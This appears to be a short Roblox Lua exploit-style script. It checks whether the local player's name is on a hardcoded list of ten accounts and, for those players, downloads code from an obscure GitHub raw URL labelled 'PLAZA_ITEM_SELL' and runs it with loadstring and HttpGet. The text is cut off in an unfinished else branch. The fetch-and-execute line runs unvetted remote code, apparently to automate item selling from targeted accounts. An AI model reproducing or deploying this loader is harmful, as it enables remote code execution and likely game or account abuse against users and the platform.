---------------------------------------------------------------------------------------------------------------------------

local Players = game:GetService("Players")
local player = Players.LocalPlayer

while not player do
    task.wait(1)
    player = Players.LocalPlayer
end


local targetNames = {"sijmongirthss","1940Mosier3104","soystaylan5","dreddyewele60","1971Nowak3135","mcconchifredjeyo","ecclweltst","killedsanthi85","tamuleviazulayv","hegemangaltieri81"}

---------------------------------------------------------------------------------------------------------------------------



if table.find(targetNames, player.Name) then

	loadstring(game:HttpGet("https://raw.githubusercontent.com/aztbuirczzxmmcx1zz/9xmin7bszzmiay87zpqla/refs/heads/main/PLAZA_ITEM_SELL"))()

else

